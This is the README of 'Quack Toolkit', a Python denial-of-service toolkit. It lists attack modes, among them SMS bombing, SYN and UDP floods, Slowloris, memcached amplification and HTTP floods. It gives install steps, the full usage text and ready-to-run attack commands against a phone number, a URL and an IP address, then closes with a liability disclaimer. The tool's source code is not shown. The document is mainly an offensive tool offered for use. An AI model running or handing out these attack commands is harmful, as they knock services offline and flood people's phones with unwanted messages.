# Quack Toolkit

![quack](https://user-images.githubusercontent.com/54115104/74247189-c04a9300-4cf6-11ea-982a-2222329215bd.jpeg)

<p align="center">
  <a href="http://entynetproject.simplesite.com/">
    <img src="https://img.shields.io/badge/entynetproject-Ivan%20Nikolsky-blue.svg">
  </a>
  <a href="https://github.com/entynetproject/quack/releases">
    <img src="https://img.shields.io/github/release/entynetproject/quack.svg">
  </a>
  <a href="https://wikipedia.org/wiki/Python_(programming_language)">
    <img src="https://img.shields.io/badge/language-python-blue.svg">
 </a>
  <a href="https://github.com/entynetproject/quack/issues?q=is%3Aissue+is%3Aclosed">
      <img src="https://img.shields.io/github/issues/entynetproject/quack.svg">
  </a>
  <a href="https://github.com/entynetproject/quack/wiki">
      <img src="https://img.shields.io/badge/wiki%20-quack-lightgrey.svg">
 </a>
  <a href="https://twitter.com/entynetproject">
    <img src="https://img.shields.io/badge/twitter-entynetproject-blue.svg">
 </a>
  <a href="https://github.com/LimerBoy/Impulse">
    <img src="https://img.shields.io/badge/based%20on-Impulse-red.svg">
 </a>
</p>

***

# About Quack Toolkit

```
Quack Toolkit is a set of tools to provide denial 
of service attacks. Quack Toolkit includes SMS attack 
tool, HTTP attack tool and many other attack tools.
```

***

# Getting started

## Quack installation

> cd quack

> chmod +x install.sh

> ./install.sh

## Quack uninstallation

> cd quack

> chmod +x uninstall.sh

> ./uninstall.sh

***

# Quack Toolkit execution

```
To run Quack Toolkit you should 
execute the following command.
```

> quack

```
usage: quack [-h] [--target <ip:port/URL/phone>]
             [--tool [SMS|NTP|TCP|UDP|SYN|POD|SLOWLORIS|MEMCACHED|HTTP|NJRAT]]
             [--timeout <timeout>] [--threads <threads>] [-u] [--version]

optional arguments:
  -h, --help            show this help message and exit
  --target <ip:port/URL/phone>
                        Target IP and port, URL or phone.
  --tool [SMS|NTP|TCP|UDP|SYN|POD|SLOWLORIS|MEMCACHED|HTTP|NJRAT]
                        Attack tool.
  --timeout <timeout>   Timeout in seconds.
  --threads <threads>   Threads count.
  -u, --update          Update Quack Toolkit.
  --version             Show Quack Toolkit version.
```

***
  
# Quack Toolkit examples

## Example of the SMS attack
    
> quack --tool SMS --target 15554443333 --timeout 10 --threads 10
    
## Example of the HTTP attack

> quack --tool HTTP --target http://<span></span>example.com/ --timeout 10 --threads 10
    
## Example of the TCP attack

> quack --tool TCP --target 192.168.1.100:80 --timeout 10 --threads 10

***

# Quack Toolkit disclaimer

```
Usage of the Quack Toolkit for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state, federal, and international laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program.
```
